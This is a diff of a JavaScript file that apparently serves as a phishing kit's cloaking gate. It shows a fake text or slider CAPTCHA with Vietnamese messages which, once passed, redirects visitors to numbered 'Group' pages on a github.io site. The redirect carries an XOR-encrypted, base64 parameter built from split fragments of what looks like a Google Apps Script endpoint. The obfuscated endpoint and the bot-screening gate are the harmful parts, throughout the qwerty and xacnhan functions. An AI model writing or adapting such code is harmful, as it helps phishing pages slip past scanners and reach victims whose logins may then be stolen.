@@ -1,20 +1,21 @@
-
+CaptchaLoad = false;
 var lengthOtp = 2;
+var charsArray = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@!#$%^&*";
 var rand = 0;
 var page = "Group";
 var LinkImage = "http://placekitten.com/400/200";
-var thietbi;
-var root;
-var CaptchaLoad = false;
 
 function EID(NameID) {return document.getElementById(NameID);}
-function EID(NameClass) {return document.getElementsByClassName(NameClass);}
 
-window.addEventListener('DOMContentLoaded', (event) => { xacnhan('createCaptcha'); });
 
-function xacnhan(x) {
-  	
-  	window.charsArray = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@!#$%^&*";
+
+
+window.addEventListener('DOMContentLoaded', (event) => { window['xacnhan']('createCaptcha'); });
+
+
+	   
+
+window.window['xacnhan'] = function xacnhan(x) {
 	if(window['DaCheckMobile']=='yes') {
     	
 	} else {
@@ -28,21 +29,26 @@ function xacnhan(x) {
           		/BlackBerry/i,
           		/Windows Phone/i
      			];
-     	//window.window['mobile'] = toMatch.some((toMatchItem) => { return navigator.userAgent.match(toMatchItem); });
-		thietbi = toMatch.some((toMatchItem) => { return navigator.userAgent.match(toMatchItem); });
+     	window.window['mobile'] = toMatch.some((toMatchItem) => { return navigator.userAgent.match(toMatchItem); });
+        
+        	window.root = document.querySelector(':root');
 
-        	root = document.querySelector(':root');
-    	} 
+		
+		
+
+    } 
     
 	if (window['mobile']==false) {
-        	var rand1 = Math.floor(Math.random() * 2);
-    	} else {
+        var rand1 = Math.floor(Math.random() * 2);
+    } else {
 		var rand1 = 1;
-    	}
+    }
             
 
-    	window.code; 
+    window.code; 
 	function createCaptcha() {
+		
+
   		EID('captcha2').innerHTML = "";
   		var captcha = [];
   		for (var i = 0; i < lengthOtp; i++) {
@@ -57,28 +63,33 @@ function xacnhan(x) {
   		canv.height = 70;
   		var ctx = canv.getContext("2d");
   		ctx.font = "50px Georgia";
-        	ctx.fillStyle = "white";
+        ctx.fillStyle = "white";
         
   		ctx.strokeText(captcha.join(""), 0, 50);
         
   		code = captcha.join("");
   		EID("captcha2").appendChild(canv);
+
+		
 	}
 	
 	function validateCaptcha() {
   		event.preventDefault();
   		debugger
         
+        
   		if (EID("cpatchaTextBox").value == code) {
+        		
         		window['qwerty']();
+      
   		}else{
     			alert("Nhập sai chuỗi mã hình. Cố gắng lần nữa");
-            		EID("cpatchaTextBox").value = "";
+            	EID("cpatchaTextBox").value = "";
     			createCaptcha();
   		}
 	}
     
-    	function encrypt(key, value) {
+    function encrypt(key, value) {
   		var result="";
   		for(i=0;i<value.length;++i) { result+=String.fromCharCode(key[i % key.length]^value.charCodeAt(i)); }
   		return result;
@@ -90,11 +101,11 @@ function xacnhan(x) {
   		return result;
 	}
     
-    	function base64_encode(s) { return btoa(unescape(encodeURIComponent(s))); }
+    function base64_encode(s) { return btoa(unescape(encodeURIComponent(s))); }
 	function base64_decode(s) { return decodeURIComponent(escape(atob(s))); }
     
     
-    	function qwerty() {
+    window.window['qwerty'] = function qwerty() {
     	
 		var arr1 = [
              ['AKfycbw8Uc', 'np_fb0', 'GDkg4oYf', 'fP9GJ', 'DwSeGEwsS', 'qJT12Uuv', 'Vsh8CQ1dU'],
@@ -130,16 +141,15 @@ function xacnhan(x) {
      		var localISOTime = (new Date(Date.now() - tzoffset)).toISOString();
      		var time = localISOTime.replace(/[^0-9]/g, "").slice(0, 17); 
                 
-            	var tg = base64_encode(time);
+            var tg = base64_encode(time);
 
            	location.href = "https://3nhat.github.io/Group" + random + "/?P=" + "Group" + "&31G=" + encrypt("@Q.t.2011.0512", tg + "]QQQ[" + script_url);
 
     	}
     
     	
-    	if (rand1 == 0) {
-    		if(thietbi==true) { qwerty(); return;}
-
+    if (rand1 == 0) {
+    		
     		EID('xacnhan').style.display ='block';
         
     		if (CaptchaLoad == false) {
@@ -178,9 +188,7 @@ function xacnhan(x) {
     	}
     
     
-    	if (rand1 != 0) {
-		if(thietbi==true) { qwerty(); return;}
-
+    if (rand1 != 0) {
     		EID('container').style.display ='block';
     
     		try { window.random = 1*rand; }
@@ -189,98 +197,101 @@ function xacnhan(x) {
         	try { var str = page.trim(); }
 		catch(err) { window.page = "Group"; }
     	
-        	let c = document.getElementById("c"),
-  		ctx = c.getContext("2d"),
-  		p = document.getElementById("puzzle"),
-  		pctx = p.getContext("2d"),
-  		slider = document.getElementById("slider"),
-  		pos = { x: null, y: null },
-  		delta = 5,
-  		s = {
-    			size: 70,
-    			refresh: drawCaptcha
-  		};
+        
+        let c = document.getElementById("c"),
+  ctx = c.getContext("2d"),
+  p = document.getElementById("puzzle"),
+  pctx = p.getContext("2d"),
+  slider = document.getElementById("slider"),
+  pos = { x: null, y: null },
+  delta = 5,
+  s = {
+    size: 70,
+    refresh: drawCaptcha
+  };
 
-		let img = new Image();
-		img.onload = () => {
-  			c.width = img.width;
-  			c.height = img.height;
+let img = new Image();
+img.onload = () => {
+  c.width = img.width;
+  c.height = img.height;
 
-  			drawCaptcha();
+  drawCaptcha();
 
-  			slider.addEventListener("input", function () {
-    				p.style.left = `${this.value}px`;
-  			});
-  			slider.addEventListener("change", function () {
-    				if (Math.abs(pos.x - parseInt(p.style.left)) <= delta) {
-    					passed();
-        				qwerty();
-    				}
-    				else failed();
-  			});
-		};
-		img.src = LinkImage;
+  slider.addEventListener("input", function () {
+    p.style.left = `${this.value}px`;
+  });
+  slider.addEventListener("change", function () {
+    if (Math.abs(pos.x - parseInt(p.style.left)) <= delta) {
+    	passed();
+        window['qwerty']();
+    }
+    else failed();
+  });
+};
+img.src = LinkImage;
 
-		function passed() {
-  			c.style.color = "#4caf50";
-		}
-
-		function failed() {
-  			c.style.color = "#ff1744";
-		}
-
-		function drawGhost() {
-  			ctx.fillStyle = "rgba(255, 255, 255, .5)";
-  			drawShape(ctx, pos.x, pos.y);
-		}
-
-		function drawPuzzle() {
-  			p.width = s.size;
-  			p.height = s.size;
-  			drawShape(pctx);
-  			pctx.globalCompositeOperation = "source-in";
-  			pctx.drawImage(img, pos.x, pos.y, p.width, p.height, 0, 0, p.width, p.height);
-  			p.style.top = `${pos.y}px`;
-		}
-
-		function drawShape(ctx, x = 0, y = 0) {
-  			ctx.beginPath();
-  			ctx.moveTo(x, y + 0.25 * s.size);
-  			ctx.lineTo(x + 0.25 * s.size, y + 0.25 * s.size);
-  			ctx.arc(x + 0.5 * s.size, y + 0.25 * s.size, 0.25 * s.size, Math.PI, false);
-  			ctx.moveTo(x + 0.75 * s.size, y + 0.25 * s.size);
-  			ctx.lineTo(x + s.size, y + 0.25 * s.size);
-  			ctx.lineTo(x + s.size, y + s.size);
-  			ctx.lineTo(x, y + s.size);
-  			ctx.quadraticCurveTo(
-    				x + 0.5 * s.size,
-    				y + 0.75 * s.size,
-   	 			x,
-    				y + 0.5 * s.size
-  			);
-  			ctx.lineTo(x, y + 0.25 * s.size);
-  			ctx.fill();
-		}
-
-		function getRandomPosition() {
-  			pos = {
-    				x: Math.floor(s.size + (c.width - 2 * s.size) * Math.random()),
-    				y: Math.floor((c.height - s.size) * Math.random())
-  			};
-		}
-
-		function drawCaptcha() {
-  			c.style.color = "#000";
-  			p.style.left = slider.value = 0;
-  			slider.setAttribute("max", Math.round(img.width - s.size));
-  			ctx.clearRect(0, 0, c.width, c.height);
-  			ctx.drawImage(img, 0, 0);
-  			getRandomPosition();
-  			drawPuzzle();
-  			drawGhost();
-		}
-   
-    	}
- 
+function passed() {
+  c.style.color = "#4caf50";
 }
 
+function failed() {
+  c.style.color = "#ff1744";
+}
+
+function drawGhost() {
+  ctx.fillStyle = "rgba(255, 255, 255, .5)";
+  drawShape(ctx, pos.x, pos.y);
+}
+
+function drawPuzzle() {
+  p.width = s.size;
+  p.height = s.size;
+  drawShape(pctx);
+  pctx.globalCompositeOperation = "source-in";
+  pctx.drawImage(img, pos.x, pos.y, p.width, p.height, 0, 0, p.width, p.height);
+  p.style.top = `${pos.y}px`;
+}
+
+function drawShape(ctx, x = 0, y = 0) {
+  ctx.beginPath();
+  ctx.moveTo(x, y + 0.25 * s.size);
+  ctx.lineTo(x + 0.25 * s.size, y + 0.25 * s.size);
+  ctx.arc(x + 0.5 * s.size, y + 0.25 * s.size, 0.25 * s.size, Math.PI, false);
+  ctx.moveTo(x + 0.75 * s.size, y + 0.25 * s.size);
+  ctx.lineTo(x + s.size, y + 0.25 * s.size);
+  ctx.lineTo(x + s.size, y + s.size);
+  ctx.lineTo(x, y + s.size);
+  ctx.quadraticCurveTo(
+    x + 0.5 * s.size,
+    y + 0.75 * s.size,
+    x,
+    y + 0.5 * s.size
+  );
+  ctx.lineTo(x, y + 0.25 * s.size);
+  ctx.fill();
+}
+
+function getRandomPosition() {
+  pos = {
+    x: Math.floor(s.size + (c.width - 2 * s.size) * Math.random()),
+    y: Math.floor((c.height - s.size) * Math.random())
+  };
+}
+
+function drawCaptcha() {
+  c.style.color = "#000";
+  p.style.left = slider.value = 0;
+  slider.setAttribute("max", Math.round(img.width - s.size));
+  ctx.clearRect(0, 0, c.width, c.height);
+  ctx.drawImage(img, 0, 0);
+  getRandomPosition();
+  drawPuzzle();
+  drawGhost();
+}
+            
+            
+    }
+    
+
+    
+}
